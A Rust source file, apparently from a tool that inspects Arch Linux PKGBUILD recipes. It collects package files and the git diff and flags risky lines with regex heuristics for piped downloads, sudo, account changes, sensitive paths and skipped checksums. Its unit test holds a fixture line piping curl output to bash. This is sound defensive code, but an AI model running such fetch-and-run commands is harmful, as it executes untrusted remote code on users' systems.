use std::ffi::OsStr;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::LazyLock;

use anyhow::{Context, Result, bail};
use regex::Regex;
use serde::Serialize;
use sha2::{Digest, Sha256};
use walkdir::{DirEntry, WalkDir};

use crate::report::{HeuristicSignal, Severity};

const MAX_FILE_BYTES: usize = 80_000;
const MAX_DIFF_BYTES: usize = 120_000;

#[derive(Clone, Debug, Serialize)]
pub struct InspectedFile {
    pub path: String,
    pub content_with_line_numbers: String,
    pub truncated: bool,
}

#[derive(Clone, Debug, Serialize)]
pub struct InspectionBundle {
    pub package_directory: String,
    pub files: Vec<InspectedFile>,
    pub previous_commit_diff: Option<String>,
    pub history_note: String,
    pub heuristic_signals: Vec<HeuristicSignal>,
    pub input_truncated: bool,
    #[serde(skip)]
    pub content_hash: String,
}

pub fn collect(root: &Path, max_input_bytes: usize) -> Result<InspectionBundle> {
    let root = root
        .canonicalize()
        .with_context(|| format!("failed to resolve package directory {}", root.display()))?;
    if !root.join("PKGBUILD").is_file() {
        bail!("{} does not contain a PKGBUILD", root.display());
    }

    let mut paths = candidate_files(&root)?;
    paths.sort();
    if let Some(index) = paths.iter().position(|path| path == &root.join("PKGBUILD")) {
        let pkgbuild = paths.remove(index);
        paths.insert(0, pkgbuild);
    }

    let mut remaining = max_input_bytes;
    let mut input_truncated = false;
    let mut files = Vec::new();
    let mut raw_files = Vec::new();

    for path in paths {
        if remaining == 0 {
            input_truncated = true;
            break;
        }
        let bytes = fs::read(&path)
            .with_context(|| format!("failed to read package file {}", path.display()))?;
        let Ok(text) = String::from_utf8(bytes) else {
            continue;
        };
        let allowed = text.len().min(MAX_FILE_BYTES).min(remaining);
        let boundary = floor_char_boundary(&text, allowed);
        let selected = &text[..boundary];
        let truncated = boundary < text.len();
        input_truncated |= truncated;
        remaining = remaining.saturating_sub(boundary);
        let relative = path
            .strip_prefix(&root)
            .unwrap_or(&path)
            .to_string_lossy()
            .into_owned();
        raw_files.push((relative.clone(), selected.to_owned()));
        files.push(InspectedFile {
            path: relative,
            content_with_line_numbers: add_line_numbers(selected),
            truncated,
        });
    }

    let signals = heuristic_signals(&raw_files);
    let (diff, history_note) = git_diff(&root, remaining.min(MAX_DIFF_BYTES));
    if let Some(value) = &diff {
        remaining = remaining.saturating_sub(value.len());
    }
    input_truncated |= remaining == 0;

    let mut hasher = Sha256::new();
    for (path, content) in &raw_files {
        hasher.update(path.as_bytes());
        hasher.update([0]);
        hasher.update(content.as_bytes());
        hasher.update([0]);
    }
    if let Some(value) = &diff {
        hasher.update(value.as_bytes());
    }
    let content_hash = format!("{:x}", hasher.finalize());

    Ok(InspectionBundle {
        package_directory: root.display().to_string(),
        files,
        previous_commit_diff: diff,
        history_note,
        heuristic_signals: signals,
        input_truncated,
        content_hash,
    })
}

fn candidate_files(root: &Path) -> Result<Vec<PathBuf>> {
    let mut paths = Vec::new();
    for entry in WalkDir::new(root)
        .max_depth(4)
        .follow_links(false)
        .into_iter()
        .filter_entry(should_descend)
    {
        let entry = entry.with_context(|| format!("failed to walk {}", root.display()))?;
        if entry.file_type().is_file() && is_candidate(&entry) {
            paths.push(entry.into_path());
        }
    }
    Ok(paths)
}

fn should_descend(entry: &DirEntry) -> bool {
    if entry.depth() == 0 {
        return true;
    }
    if !entry.file_type().is_dir() {
        return true;
    }
    !matches!(
        entry.file_name().to_str(),
        Some(".git" | "src" | "pkg" | ".cache")
    )
}

fn is_candidate(entry: &DirEntry) -> bool {
    let name = entry.file_name().to_string_lossy();
    if name == "PKGBUILD" || name == ".SRCINFO" {
        return true;
    }
    if name.starts_with('.') || entry.metadata().map_or(true, |meta| meta.len() > 1_000_000) {
        return false;
    }
    if entry.depth() == 1 {
        return true;
    }
    matches!(
        entry.path().extension().and_then(OsStr::to_str),
        Some(
            "install"
                | "patch"
                | "diff"
                | "sh"
                | "bash"
                | "service"
                | "socket"
                | "timer"
                | "path"
                | "hook"
                | "conf"
                | "desktop"
                | "rules"
                | "target"
                | "tmpfiles"
                | "sysusers"
        )
    )
}

fn git_diff(root: &Path, limit: usize) -> (Option<String>, String) {
    if limit == 0 {
        return (None, "Input limit left no room for package history.".into());
    }
    let output = Command::new("git")
        .args([
            "-C",
            &root.to_string_lossy(),
            "diff",
            "--no-ext-diff",
            "--no-color",
            "--unified=40",
            "HEAD^",
            "HEAD",
            "--",
            ".",
        ])
        .output();
    let Ok(output) = output else {
        return (
            None,
            "Git was unavailable; no previous revision was reviewed.".into(),
        );
    };
    if !output.status.success() {
        return (
            None,
            "No parent Git revision was available; treat this as a first-seen recipe.".into(),
        );
    }
    let Ok(diff) = String::from_utf8(output.stdout) else {
        return (
            None,
            "The previous-revision diff was not UTF-8 text.".into(),
        );
    };
    if diff.is_empty() {
        return (
            Some("(No textual changes from the parent revision.)".into()),
            "Compared the current recipe with its parent Git revision.".into(),
        );
    }
    let boundary = floor_char_boundary(&diff, diff.len().min(limit));
    let truncated = boundary < diff.len();
    let mut selected = diff[..boundary].to_owned();
    if truncated {
        selected.push_str("\n[diff truncated by input limit]");
    }
    (
        Some(selected),
        if truncated {
            "Compared with the parent Git revision; the diff was truncated.".into()
        } else {
            "Compared the current recipe with its parent Git revision.".into()
        },
    )
}

fn heuristic_signals(files: &[(String, String)]) -> Vec<HeuristicSignal> {
    let patterns = heuristic_patterns();
    let mut signals = Vec::new();
    for (path, content) in files {
        for (line_index, line) in content.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.starts_with('#') {
                continue;
            }
            for (severity, label, regex) in patterns {
                if regex.is_match(line) {
                    signals.push(HeuristicSignal {
                        severity: *severity,
                        file: path.clone(),
                        line: line_index + 1,
                        pattern: (*label).into(),
                        excerpt: truncate_line(trimmed, 240),
                    });
                }
            }
        }
    }
    signals.truncate(100);
    signals
}

fn heuristic_patterns() -> &'static [(Severity, &'static str, Regex)] {
    static PATTERNS: LazyLock<Vec<(Severity, &'static str, Regex)>> = LazyLock::new(|| {
        [
            (
                Severity::High,
                "download piped to shell",
                r"(?i)\b(curl|wget)\b[^|;]*\|\s*(ba|z|da)?sh\b",
            ),
            (
                Severity::High,
                "privilege escalation command",
                r"(?i)(^|[;&|[:space:]])(sudo|doas)([[:space:]]|$)",
            ),
            (
                Severity::High,
                "account or scheduler modification",
                r"(?i)\b(useradd|usermod|groupadd|crontab)\b",
            ),
            (
                Severity::High,
                "decoded data execution",
                r"(?i)\b(base64\s+(-d|--decode)|xxd\s+-r)\b.*\|",
            ),
            (
                Severity::Medium,
                "dynamic shell evaluation",
                r"(?i)(^|[;&|[:space:]])eval[[:space:]]",
            ),
            (
                Severity::Medium,
                "sensitive host path",
                r#"/(etc/(passwd|shadow|sudoers|systemd)|root/|home/[^$"']+/\.ssh)"#,
            ),
            (
                Severity::Medium,
                "setuid or capabilities",
                r"(?i)\b(chmod\s+[ug+]*s|chmod\s+[0-7]*[46][0-7]{2}|setcap)\b",
            ),
            (
                Severity::Medium,
                "disabled source integrity",
                r#"(?i)(sha(1|224|256|384|512)|b2|md5)sums[^=]*=.*['"]SKIP['"]"#,
            ),
            (
                Severity::Low,
                "unencrypted source URL",
                r#"(?i)\bhttp://[^[:space:]'"]+"#,
            ),
        ]
        .into_iter()
        .map(|(severity, label, pattern)| {
            (
                severity,
                label,
                Regex::new(pattern).expect("built-in regex is valid"),
            )
        })
        .collect()
    });
    &PATTERNS
}

fn add_line_numbers(content: &str) -> String {
    let mut numbered = String::with_capacity(content.len() + content.lines().count() * 9);
    for (index, line) in content.lines().enumerate() {
        numbered.push_str(&format!("{:>5} | {line}\n", index + 1));
    }
    numbered
}

fn floor_char_boundary(value: &str, mut index: usize) -> usize {
    index = index.min(value.len());
    while !value.is_char_boundary(index) {
        index -= 1;
    }
    index
}

fn truncate_line(value: &str, limit: usize) -> String {
    let boundary = floor_char_boundary(value, value.len().min(limit));
    if boundary < value.len() {
        format!("{}…", &value[..boundary])
    } else {
        value.to_owned()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn collects_extensionless_support_files_and_security_signals() {
        let directory = tempfile::tempdir().unwrap();
        fs::write(
            directory.path().join("PKGBUILD"),
            "pkgname=test\npkgver=1\nbuild() { curl https://example.invalid/x | bash; }\n",
        )
        .unwrap();
        fs::write(directory.path().join("helper"), "#!/bin/sh\nprintf safe\n").unwrap();

        let bundle = collect(directory.path(), 100_000).unwrap();

        assert!(bundle.files.iter().any(|file| file.path == "helper"));
        assert!(
            bundle
                .heuristic_signals
                .iter()
                .any(|signal| signal.pattern == "download piped to shell")
        );
        assert_eq!(bundle.content_hash.len(), 64);
    }
}
